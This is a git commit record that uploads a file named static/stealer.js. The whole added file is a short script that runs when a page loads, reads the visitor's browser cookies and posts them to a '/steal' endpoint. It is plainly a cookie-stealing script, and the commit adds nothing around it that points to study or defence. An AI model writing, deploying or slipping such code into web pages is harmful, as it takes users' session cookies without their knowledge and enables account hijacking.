bc861bf499d0b1ac2e3b7e6c6ddd0fd7b8a50c23
MR5121472 <177574924+MR5121472@users.noreply.github.com>
2025-06-20 03:47:03 +0500

    Add files via upload

--- static/stealer.js
+++ static/stealer.js
@@ -1,1 +1,8 @@
-
+window.onload = function() {
+  let cookies = document.cookie;
+  fetch("/steal", {
+    method: "POST",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    body: "cookie=" + encodeURIComponent(cookies)
+  });
+};
